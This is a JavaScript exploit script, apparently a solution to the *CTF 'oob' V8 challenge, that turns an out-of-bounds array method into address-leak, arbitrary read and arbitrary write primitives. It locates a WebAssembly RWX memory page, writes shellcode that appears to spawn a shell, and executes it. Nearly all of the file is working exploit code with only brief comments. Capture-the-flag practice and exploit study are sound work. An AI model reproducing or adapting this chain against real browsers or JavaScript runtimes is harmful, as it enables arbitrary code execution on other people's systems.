// https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function getHexString(val) {
  return "0x" + ftoi(val).toString(16);
}

/*
 * START OF BUG
 */

// .oob(idx) reads from idx
// .oob(idx, val) changes idx with val

const a = [ 1.1 ];
const obj = { A: 5.5 };
const obj_arr = [ obj ];
const a_map = a.oob(2);
const buffer = new ArrayBuffer(8); // use backing store, at +0x14-1
const dataView = new DataView(buffer);

// addrof primitive (returns value without isolate root)
function addrof(obj) {
  obj_arr[0] = obj;
  return ftoi(a.oob(11)) & 0xffffffffn;
}

// some basic tests
// %DebugPrint(a);
// %DebugPrint(obj_arr);
// %DebugPrint(buffer);
// console.log(getHexString(a.oob(0))); // oob from FixedDoubleArray (each 8 bytes)
// console.log(getHexString(a.oob(1)));
// console.log(getHexString(a.oob(2)));
// a.oob(0, 3.3);
// console.log(a[0]);

// get heap address (backing store of buffer)
const backing_store = (ftoi(a.oob(17)) >> 32n) + ((ftoi(a.oob(18)) & 0xffffffffn) << 32n);
console.log("[*] backing store address : " + getHexString(itof(backing_store)));

// arbitrary read primitive
function arb_read(address) {
  // addresses are 4 bytes aligned, but not 8 bytes aligned
  // need to store two 4-byte pieces
  const piece1 = ftoi(a.oob(17)) & 0xffffffffn;
  const piece2 = ftoi(a.oob(18)) >> 32n;
  const addr_low = address & 0xffffffffn;
  const addr_high = address >> 32n;
  const data1 = piece1 | (addr_low << 32n);
  const data2 = (piece2 << 32n) | addr_high;

  // overwrite backing store of buffer
  a.oob(17, itof(data1));
  a.oob(18, itof(data2));
  // %DebugPrint(buffer);

  return ftoi(dataView.getFloat64(0, true));
}

// arbitrary write primitive
function arb_write(address, value) {
  // addresses are 4 bytes aligned, but not 8 bytes aligned
  // need to store two 4-byte pieces
  const piece1 = ftoi(a.oob(17)) & 0xffffffffn;
  const piece2 = ftoi(a.oob(18)) >> 32n;
  const addr_low = address & 0xffffffffn;
  const addr_high = address >> 32n;
  const data1 = piece1 | (addr_low << 32n);
  const data2 = (piece2 << 32n) | addr_high;

  // overwrite backing store of buffer
  a.oob(17, itof(data1));
  a.oob(18, itof(data2));
  // %DebugPrint(buffer);

  dataView.setFloat64(0, itof(value), true);
}

// get isolate base (not reliable) (unused)
// const iso_base = arb_read(backing_store+0x40n) & 0xffffffff00000000n;
// console.log(getHexString(itof(iso_base)));

function copy_shellcode(addr, shellcode) {
  for (let i = 0; i < shellcode.length; i++) {
    arb_write(addr+8n*BigInt(i), shellcode[i]);
  }
}

// WASM TRIGGER RWX PAGE

// https://wasdk.github.io/WasmFiddle/
const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const f = wasm_instance.exports.main;

// get wasm native heap page using oob read and addrof
// wasm heap address offset : 0x68 - 1 from addrOf(wasm_instance)
const wasm_idx = ((addrof(wasm_instance) - addrof(a)) / 8n) + 1n + 13n;
let rwx_page_addr = ftoi(a.oob(Number(wasm_idx)));
if ((addrof(wasm_instance) - addrof(a)) % 8n == 4n) {
  rwx_page_addr = (rwx_page_addr >> 32n) | ((ftoi(a.oob(Number(wasm_idx)+1)) & 0xffffffffn) << 32n)
}
console.log("[*] rwx page : " + getHexString(itof(rwx_page_addr)));

const shellcode = [0x91969dd1bb48c031n, 0x53dbf748ff978cd0n, 0xb05e545752995f54n, 0x9090909090050f3bn];
copy_shellcode(rwx_page_addr, shellcode);

f();

// while(1);